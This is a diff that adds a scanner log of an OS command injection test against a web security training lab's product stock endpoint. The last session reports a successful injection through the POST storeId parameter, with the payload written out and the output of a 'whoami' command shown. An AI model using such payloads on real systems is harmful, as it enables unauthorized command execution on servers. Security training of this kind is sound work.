@@ -1,0 +1,26 @@
+
+=====================================
+| Started in 2025-10-24 at 15:12:07 |
+=====================================
+[info] Tested URL : https://0af600dd044c85c682e5666300b20000.web-security-academy.net/product?productId=1
+=====================================
+| Started in 2025-10-24 at 15:15:46 |
+=====================================
+[info] Tested URL : https://0af600dd044c85c682e5666300b20000.web-security-academy.net/product?productId=1
+=====================================
+| Started in 2025-10-24 at 15:19:03 |
+=====================================
+[info] Tested URL : https://0af600dd044c85c682e5666300b20000.web-security-academy.net/product/stock
+=====================================
+| Started in 2025-10-24 at 15:23:55 |
+=====================================
+[info] Tested URL : https://0af600dd044c85c682e5666300b20000.web-security-academy.net/product/stock
+=====================================
+| Started in 2025-10-24 at 15:35:02 |
+=====================================
+[info] Tested URL : https://0af600dd044c85c682e5666300b20000.web-security-academy.net/product/stock
+[info] Type: Results-Based Os Command Injection
+[info] Technique: Classic Command Injection Technique
+[info] Parameter: (POST) storeId
+[info] Used payload: 1;echo RNKMAR$((76%2B99))$(echo RNKMAR)RNKMAR
+[info] User-supplied command 'whoami' execution output: peter-5k4xxg
